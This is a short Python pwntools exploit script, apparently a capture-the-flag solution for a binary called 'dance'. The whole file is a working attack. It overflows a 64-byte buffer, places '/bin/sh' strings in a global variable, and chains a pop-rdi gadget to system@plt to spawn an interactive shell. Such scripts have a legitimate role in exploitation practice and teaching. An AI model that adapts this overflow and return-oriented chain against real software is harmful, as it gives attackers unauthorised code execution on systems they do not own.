#!/usr/bin/python
# coding: utf-8

from pwn import *

# context.log_level = 'debug'

filename = "./dance"
e = ELF(filename)
p = process(e.path)

log.info("system@plt : {0}".format(hex(e.plt['system'])))

system_plt = e.plt['system']

setrdirbp = 0x00000000004008fa
setrsi = 0x0000000000400cb1

globalvar = 0x6020E0

def menu(c):
    c = str(c)
    print p.recvuntil("4. exit\n")
    p.sendline(c)

def main():

    menu(1)
    print p.recv(1024)
    payload = "wellwell;/bin/sh;"
    payload += "/bin/sh;" * 3
    payload += "A" * (0x40 - len(payload))
    payload += "B" * 8
    payload += p64(setrdirbp)
    payload += p64(globalvar + 33)
    payload += p64(globalvar + 32)
    payload += p64(system_plt)
    p.sendline(payload)

    log.info("rdi : " + hex(globalvar + 32))

    print p.recv(1024)

    p.interactive()

if __name__ == "__main__":
    main()

